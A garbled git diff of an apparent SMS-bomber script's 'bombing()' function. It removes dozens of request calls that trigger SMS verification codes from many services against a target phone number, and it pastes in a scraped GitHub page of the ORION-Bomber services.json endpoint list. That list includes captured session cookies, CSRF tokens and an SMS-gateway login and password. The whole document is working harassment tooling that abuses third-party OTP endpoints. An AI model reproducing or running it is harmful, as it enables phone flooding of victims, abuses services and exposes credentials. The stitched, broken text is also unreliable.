@@ -347,213 +347,289 @@ def bombing():
     phone8 = '8' + phone[1:]
     email = name+f'{iteration}'+'@gmail.com'
     email = name+f'{iteration}'+'@gmail.com'
-    try:
-        requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': phone}, headers=HEADERS)
-        print('SunLight: отправлено')
-    except:
-        print('SunLight: не отправлено')
-
-    try:
-        requests.post('https://cloud.mail.ru/api/v2/notify/applink',json = {"phone": phone_plus, "api": 2, "email": "email","x-email": "x-email"}, headers=HEADERS)
-        print('iCloud: отправлено')
-    except:
-        print('iCloud: не отправлено')
-
-    try:
-    	requests.post('https://b.utair.ru/api/v1/login/', data = {'login':phone8}, headers=HEADERS)
-    	print('Utair: отправлено')
-    except:
-        print('Utair: не отправлено')
-
-    try:
-        requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data = {"phone_number":phone}, headers=HEADERS)
-        print('Tinder: отправлено')
-    except:
-        print('Tinder: не отправлено')
-
-    try:
-        requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data = {"st.r.phone": phone_plus}, headers=HEADERS)
-        print('Одноклассники: отправлено')
-    except:
-        print('Одноклассники: не отправлено')
-
-    try:
-    	requests.post('https://app.karusel.ru/api/v1/phone/', data = {"phone":phone}, headers=HEADERS)
-    	print('Карусель: отправлено')
-    except:
-        print('Карусель: не отправлено')
-
-    try:
-        requests.post('https://youdrive.today/login/web/phone', data = {'phone': phone9, 'phone_code': '7'},headers=HEADERS)
-        print('YouDrive: отправлено')
-    except:
-        print('YouDrive: не отправлено')
-
-    try:
-    	requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': phone}, headers=HEADERS)
-    	print('MTS TV: отправлено')
-    except:
-        print('MTS TV: не отправлено')
-
-    try:
-    	requests.post('https://youla.ru/web-api/auth/request_code', json = {"phone":phone_plus}, headers=HEADERS)
-    	print('Юла: отправлено')
-    except:
-        print('Юла: не отправлено')
-
-    try:
-        requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + phone}, headers=HEADERS)
-        print('Яндекс.Еда: не отправлено')
-    except:
-        print('Яндекс.Еда: не отправлено')
-
-    try:
-        requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data= {"phone": phone}, headers=HEADERS)
-        print('IVI: отправлено')
-    except:
-        print('IVI: не отправлено')
-
-    try:
-        requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": phone, "SignupForm[device_type]": 3}, headers=HEADERS)
-        print('DeliTime: отправлено')
-    except:
-        print('DeliTime: не отправлено')
-
-    try:
-        requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"}, headers=HEADERS)
-        print('ICQ: отправлено')
-    except:
-        print('ICQ: не отправлено')
-
-    try:
-        requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
-        print('Grabaxi: отправлено')
-    except:
-        print('GrabTaxi: не отправлено')
-
-    try:
-        requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': phone9}).json()['res']
-        print('RuTaxi: отправлено')
-    except:
-        print('RuTaxi: не отправлено')
-
-    try:
-        requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': phone_plus}, headers={})
-        print('Tinkoff: отправлено')
-    except:
-        print('Tinkoff: не отправлено')
-
-    try:
-        requests.post('https://www.rabota.ru/remind', data={'credential': phone})
-        print('Работа: отправлено')
-    except:
-        print('Работа: не отправлено')
-
-    try:
-        requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': phone_plus})
-        print('Rutube: отправлено')
-    except:
-        print('Rutube: не отправлено')
-
-    try:
-        requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': name,'phone': phone, 'promo': 'yellowforma'})
-        print('Smsint: отправлено')
-    except:
-        print('Smsint: не отправлено')
-
-    try:
-        requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone=' + phone9 + '&country_code=%2B7&nod=4&locale=en')
-        print('Oyorooms: отправлено')
-    except:
-        print('Oyorooms: не отправлено')
-
-    try:
-        requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': phone,'g-recaptcha-response': '','recaptcha': 'on'})
-        print('Мвидео: отправлено')
-    except:
-        print('Мвидео: не отправлено')
-
-    try:
-        requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
-        print('Newnext: отправлено')
-    except:
-        print('Newnext: не отправлено')
-
-    try:
-        requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': phone})
-        print('Invitro: отправлено')
-    except:
-        print('Invitro: не отправлено')
-
-    try:
-        requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
-        print('Psbank: отправлено')
-    except:
-        print('PSbank: не отправлено')
-
-    try:
-        requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': phone})
-        print('Beltelcom: отправлено')
-    except:
-        print('Beltelcom: не отправлено')
-
-    try:
-        requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + phone})
-        print('KFC: отправлено')
-    except:
-        print('KFC: не отправлено')
-
-    try:
-        requests.post('https://api.carsmile.com/',json={'operationName': 'enterPhone', 'variables': {'phone': phone},'query': 'mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n'})
-        print('Carsmile: отправлено')
-    except:
-        print('Carsmile: не отправлено')
-
-    try:
-        requests.post('https://www.citilink.ru/registration/confirm/phone/+' + phone + '/')
-        print('Citilink: отправлено')
-    except:
-        print('CitiLink: не отправлено')
-
-    try:
-        requests.post('https://terra-1.indriverapp.com/api/authorization?locale=ru',data={'mode': 'request', 'phone': '+' + phone,'phone_permission': 'unknown', 'stream_id': 0, 'v': 3, 'appversion': '3.20.6','osversion': 'unknown', 'devicemodel': 'unknown'})
-        print('InDriver: отправлено')
-    except:
-        print('Indriver: не отправлено')
-
-    try:
-        requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone': '+' + self.formattedphone})
-        print('Lenta: отправлено')
-    except:
-        print('Lenta: не отправлено')
-
-    try:
-        requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={'phone': '+' + phone, 'api': 2, 'email': 'email','x-email': 'x-email'})
-        print('Mail.ru: отправлено')
-    except:
-        print('Mail.ru: не отправлено')
-
-    try:
-        requests.post('https://plink.tech/register/',json={'phone': phone})
-        print('Plink: отправлено')
-    except:
-        print('Plink: не отправлено')
-
-    try:
-        requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json = {"phone": phone}, headers=HEADERS)
-        print('Qlean: отправлено')
-    except:
-        print('Qlean: не отправлено')
-
-    try:
-        requests.post('https://passport.twitch.tv/register?trusted_request=true',json={'birthday': {'day': 11, 'month': 11, 'year': 1999},'client_id': 'kd1unb4b3q4t58fwlpcbzcbnm76a8fp', 'include_verification_code': True,'password': password, 'phone_number': phone,'username': username})
-        print('Twitch: отправлено')
-    except:
-        print('Twitch: не отправлено')
-
-    try:
-        requests.post('https://www.delivery-club.ru/ajax/user_otp', data={'phone': phone})
-        print('DeliveryClub: отправлено')
-    except:
-        print('DeliveryClub: не отправлено')
+    
+Sign up
+Lucky1376
+/
+ORION-Bomber
+Public
+Code
+Issues
+1
+Pull requests
+1
+Actions
+Projects
+Security
+Insights
+ORION-Bomber/tools/services.json
+@Lucky1376
+Lucky1376 Update 1.2.0 by Lucky | Services by LostIk31 and FL1NEE
+ 2 contributors
+336 lines (336 sloc)  14.4 KB
+{
+  "ru":
+  [
+    {
+      "apteka.ru": {
+        "url": "https://api.apteka.ru/Auth/Auth_Code?cityUrl=moskva",
+        "json": "{'phone': '*phone()*' , 'u': 'U'}",
+        "headers": {
+          "Accept": "*/*",
+          "Accept-Encoding": "gzip, deflate, br",
+          "Accept-Language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
+          "Access-Control-Request-Headers": "authorization,content-type",
+          "Access-Control-Request-Method": "POST",
+          "Connection": "keep-alive",
+          "Host": "api.apteka.ru",
+          "Origin": "https://apteka.ru",
+          "Referer": "https://apteka.ru/",
+          "Sec-Fetch-Dest": "empty",
+          "Sec-Fetch-Mode": "cors",
+          "Sec-Fetch-Site": "same-site",
+          "User-Agent": ""
+        },
+        "response": 200,
+        "timeout": 120
+      },
+      "magnit": {
+        "url": "https://new.moy.magnit.ru/local/ajax/login/",
+        "data": "{'phone': '*+phone*', 'ksid': 'ee191257-a4fe-4e39-9f0f-079c7f721eee_0'}",
+        "response": "json",
+        "timeout": 120
+      },
+      "telegram": {
+        "url": "https://my.telegram.org/auth/send_password",
+        "data": "{'phone': '*+phone*'}",
+        "response": 200,
+        "timeout": 120
+      },
+      "citi_link": {
+        "url": "https://www.citilink.ru/registration/confirm/phone/*phone*/",
+        "data": "{'phone': '*phone*', 'ret': '1', 'smsRepeatDelay': '60', 'smsRepeatsDelay': '60', 'smsRepeatsLimit': '5', 'smsRequestToken': 't19d686d-6d80-4297-8909-b11c575627b8'}",
+        "response": 200,
+        "timeout": 60
+      },
+      "akbarsa": {
+        "url": "https://www.akbars.ru/api/PhoneConfirm/",
+        "json": "{'phoneNumber': *phone*}",
+        "response": 200,
+        "timeout": 300
+      },
+      "yota": {
+        "url": "https://bmp.tv.yota.ru/api/v10/auth/register/msisdn",
+        "json": "{'msisdn': '*phone*', 'password': '123456'}",
+        "cookies": "https://tv.yota.ru/",
+        "response": 201,
+        "timeout": 60
+      },
+      "b_apteka": {
+        "url": "https://b-apteka.ru/lk/send_confirm_code",
+        "json": "{'phone': '*phone*'}",
+        "headers": {
+          "X-Requested-With": "XMLHttpRequest",
+          "Connection": "keep-alive",
+          "Pragma": "no-cache",
+          "Cache-Control": "no-cache",
+          "Accept-Encoding": "gzip, deflate, br",
+          "User-Agent": "",
+          "DNT": "1"
+        },
+        "response": 200,
+        "timeout": 60
+      },
+      "pochtabank": {
+        "url": "https://my.pochtabank.ru/dbo/registrationService/ib/phoneNumber",
+        "json": "{'confirmation': 'send', 'phone': '*phone()*'}",
+        "response": 200,
+        "timeout": 120
+      },
+      "mt_free": {
+        "url": "https://cabinet.wi-fi.ru/api/auth/by-sms",
+        "data": "{'msisdn': '*mtfree*', 'g-recaptcha-response': ''}",
+        "headers": {
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+          "Accept-Encoding": "gzip, deflate, br",
+          "Accept-Language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
+          "App-ID": "cabinet",
+          "Cache-Control": "no-cache",
+          "Connection": "keep-alive",
+          "User-Agent": ""
+        },
+        "response": "json",
+        "timeout": 180
+      },
+      "megafon.tv": {
+        "url": "https://bmp.megafon.tv/api/v10/auth/register/msisdn",
+        "json": "{'msisdn':'*+phone*', 'password':'123456'}",
+        "response": 201,
+        "timeout": 600,
+        "cookies": "https://megafon.tv/"
+      },
+      "moezdorovie": {
+        "url": "https://moezdorovie.ru/rpc/?method=auth.GetCode",
+        "json": "{'jsonrpc':'2.0','id':40,'method':'auth.GetCode','params':{'phone':'*-phone*','mustExist':false, 'sendRealSms':true}}",
+        "response": 200,
+        "timeout": 300
+      },
+      "totopizza": {
+        "url": "https://api.totopizza.ru/graphql",
+        "json": "{\"operationName\":\"requestPhoneCodeAuth\",\"query\":\"\\n  mutation requestPhoneCodeAuth($telephone:String!) {\\n    requestPhoneCodeAuth(telephone:$telephone)\\n  }\\n\",\"variables\":{\"telephone\":\"*phone2*\"}}",
+        "response": 200,
+        "timeout": 60
+      },
+      "zdesapteka": {
+        "url": "https://zdesapteka.ru/bitrix/services/main/ajax.php?action=zs:main.ajax.AuthActions.sendAuthCode",
+        "data": "{'userPhone': '*phone()*', 'SITE_ID': 's1', 'sessid': ''}",
+        "response": 200,
+        "timeout": 60,
+        "cookies": "https://zdesapteka.ru/"
+      },
+      "stockmann": {
+        "url": "https://stockmann.ru/ajax/?controller=user&action=registerUser&surname=Popovich&name=Oleg&phone=*phone3*&email=rgeaefs@gmail.com&password=123456&password_confirm=123456",
+        "response": 200,
+        "timeout": 600
+      },
+      "SberUslugi": {
+        "url": "https://sberuslugi.ru/api/v1/user/secret",
+        "data": "{'phone': '*phone()*'}",
+        "response": 200,
+        "timeout": 180
+      },
+      "victoria": {
+        "url": "https://new.victoria-group.ru/api/v2/manzana/Identity/RequestAdvancedPhoneEmailRegistration",
+        "response": 200,
+        "timeout": 60
+      },
+      "sunlight": {
+        "url": "https://api.sunlight.net/v3/customers/authorization/",
+        "json": "{'phone':'*phone*'}",
+        "response": 200,
+        "timeout": 30,
+        "cookies": "https://sunlight.net/profile/login/?next_encoded=Lw=="
+      },
+      "ok.ru": {
+        "url": "https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
+        "data": "{'st.r.phone': '*phone*'}",
+        "response": 200,
+        "timeout": 60,
+        "cookies": "https://ok.ru/"
+      },
+      "citystar": {
+        "url": "https://citystarwear.com/bitrix/templates/bspc/php/bs.auth.sms/templates/pc/handlers.php",
+        "data": "{'hdlr': 'bsSendCodeAuth','bshsmsk': 'h5Plm22xoaFs9YTp', 'phone': '*-phone*', 'xemail': '', 'xphone': ''}",
+        "response": 200,
+        "timeout": 180
+      },
+      "beerlogapizza": {
+        "url": "https://smsc.ru/sys/send.php",
+        "data": "{'login': 'beerlogaa@gmail.com', 'psw': 'QWE780p', 'phones': '*+phone*', 'mes': 'code', 'call': '1', 'fmt': '3'}",
+        "response": 201,
+        "timeout": 60,
+        "cookies": "https://beerlogapizza.ru/login/"
+      },
+      "pizzamia": {
+        "url": "https://1603.smartomato.ru/account/session",
+        "data": "{'g-recaptcha-response': 'null','phone': '*phone3*'}",
+        "response": 200,
+        "timeout": 60
+      },
+      "lentaru": {
+        "url": "https://online.lenta.com/api.php",
+        "data": "{'tel': '*phone()*', 'accept': 'on', 'urlParams': ''}",
+        "response": 200,
+        "headers": {
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+          "Accept-Encoding": "gzip, deflate, br",
+          "Accept-Language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
+          "Cache-Control": "no-cache",
+          "Connection": "keep-alive",
+          "User-Agent": "",
+          "X-Requested-With": "XMLHttpRequest"
+        },
+        "timeout": 60,
+        "cookies": "https://online.lenta.com"
+      },
+      "wildberries": {
+        "url": "https://authorization.wildberries.eu/api/v2/code/request",
+        "json": "{\"contact\": \"*phone*\", \"auth_method\": \"sms\", \"lang\": \"ru\"}",
+        "response": 200,
+        "timeout": 60
+      },
+      "findclone": {
+        "url": "https://findclone.ru/register",
+        "data": "{'phone': '*phone*'}",
+        "response": 200,
+        "timeout": 60,
+        "GET": ""
+      },
+      "tashirpizza": {
+        "url": "https://tashirpizza.ru/ajax/mindbox_register",
+        "data": "{'phone': '*phone()*', 'fio': 'Олег Олегов Олегович', 'bd': ''}",
+        "response": 200,
+        "timeout": 60
+      },
+      "my-shop": {
+        "url": "https://my-shop.ru/cgi-bin/my_util2.pl?q=my_code_for_phone_confirmation&view_id=d51a4d42-c5e8-43ce-a24d-383a3b29f17ae821ed918",
+        "json": "{'phone_code': '7', 'phone': '*-phone*'}",
+        "response": 200,
+        "timeout": 60
+      },
+      "bisonpizza": {
+          "url": "https://bizonpizza.ru/api/auth/send-sms-verification-code",
+          "json": "{'phoneNumber': '*+phone*'}",
+          "response": 200,
+          "timeout": 60
+      },
+      "magnitapteka": {
+        "url": "https://apteka.magnit.ru/api/personal/auth/code/",
+        "data": "{'phone': '*phone*'}",
+        "response": 200,
+        "timeout": 60
+      },
+      "eldorado": {
+        "url": "https://www.eldorado.ru/_ajax/spa/auth/v2/auth_with_login.php",
+        "json": "{'user_login': '*eldarado*'}",
+        "response": 200,
+        "timeout": 60
+      },
+      "kent": {
+        "url": "https://kent.ru/api/send-confirm?qr=",
+        "json": "{'type': 'sms', 'contact': '*phone*', 'case': 'register'}",
+        "response": 200,
+        "timeout": 60
+      },
+      "polyana1c": {
+        "url": "https://polyana1c.ru:25101/CRM/hs/pd/auth/send-code",
+        "json": "{'phoneNumber': '*+phone*'}",
+        "response": 200,
+        "timeout": 600
+      },
+      "citystarwear": {
+        "url": "https://m.citystarwear.com/bitrix/templates/bs-base/php/includes/bs-handlers.php",
+        "data": "{'hdlr': 'bsAuthSendCode', 'key': 'DOvBhIav34535434v212SEoVINS', 'phone': '*-phone*', 'pcode': '7', 'vphone': '*-phone*'}",
+        "response": 200,
+        "timeout": 180,
+        "headers": {
+          "cookie": "_ga=GA1.2.1427439092.1661873883; tmr_lvid=7f1742aab6354e49610b859181e4cd90; tmr_lvidTS=1661873883545; BX_USER_ID=5e66c0741eefeeba48abfe666e49687a; _ym_uid=1661873884168755235; _ym_d=1661873884; _tt_enable_cookie=1; _ttp=01839738-27cc-4c5b-ae4a-be99662bcaf5; I_BITRIX2_SM_bsAuthPhone=9502135308; PHPSESSID=NNGLA4WVIkGxrlj8zMwacQQ75E9g7b6R; I_BITRIX2_SM_bsSiteVersionRun=D; I_BITRIX2_SM_SALE_UID=66dde7a489d38a413233c60f5ea227bd; _gid=GA1.2.85927779.1667044483; _ym_isad=1; _ym_visorc=w; I_BITRIX2_SM_BSPopUpBnr=%7B%2296591%22%3A1667130902%7D; tmr_detect=1%7C1667044505998; cto_bundle=qQMtx19qZFFHeFglMkJRQlNMcTBIUGR4VG9Rc3pLJTJCb2FaaFFyR2hndVh1azY2elRHZ1Zrbk1wZGJFTiUyQjFWJTJCQjdWQnRRb25XTnpsaDk5RGFuYWRhN3ZVWkJ3MURwbWIzUjVGem0lMkJrQUFKd25VaTVGV3FOS0pCak5ET0hLMU0lMkJqanVTRk9uZVREeG14anF4NnMzRzk5JTJGJTJGVEI3c1dJJTJCQmNTUGp4aWJWbFFXTWozb1lzQnMlM0Q; tmr_reqNum=16"
+        }
+      },
+      "vardex": {
+        "url": "https://www.vardex.ru/bitrix/services/main/ajax.php?mode=class&c=vardex%3Amain.auth&action=sendConfirmCode",
+        "json": "{'phone': '*vardex*', 'new': 'false'}",
+        "response": 200,
+        "timeout": 120,
+        "headers": {"x-bitrix-csrf-token": "1023f1844f62f888d4b35f1e39e306fb", "x-bitrix-site-id": "s1", "cookie": "PHPSESSID=4npNhUXACzFbLeO0SZR1ZRfUu6rnJzzr; REFERER=https%3A%2F%2Fwww.google.com%2F; LANDING_PAGE=%2Findex.php; USER_CITY_ID=997; BITRIX_SM_SALE_UID=90053950; BITRIX_SM_PK=997; _ga=GA1.2.1040077275.1667045453; _gid=GA1.2.448176478.1667045453; rrpvid=492574795716432; rcuid=62f1473f2534d0f27d07c026; _gat=1; _userGUID=0:l9tvtkhg:axyo7jLYuXeLgyy0~bEB0Fh2vUfUndzQ; dSesn=42427647-2094-beb6-f85a-f4b090bb4a67; _dvs=0:l9tvtkhg:oQ517cjrDOXBxqpjE34iDqzPYNcspDq3; _ym_uid=1667045454951407587; _ym_d=1667045454; BX_USER_ID=5e66c0741eefeeba48abfe666e49687a; _ym_isad=1; _ym_visorc=b; rrwpswu=true; rrwpswu=true; BITRIX_SM_AGREE18PLUS=1"}
+      },
+      "tinkoff": {
+        "url":  "https://www.tinkoff.ru/api/common/v1/sign_up?origin=web%2Cib5%2Cplatform&sessionid=uRdqKtttiyJYz6ShCqO076kNyTraz7pa.m1-prod-api56&wuid=8604f6d4327bf4ef2fc2b3efb36c8e35",
+        "data": "{'phone': '*phone*'}",
+        "response": 200,
+        "timeout": 60
+      },
+      "sipnetru": {
+        "url": "https://register2.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper?oper=9&callmode=1&phone=*phone*",
+        "response": 200,
+        "timeout": 60
+  
 Logo()
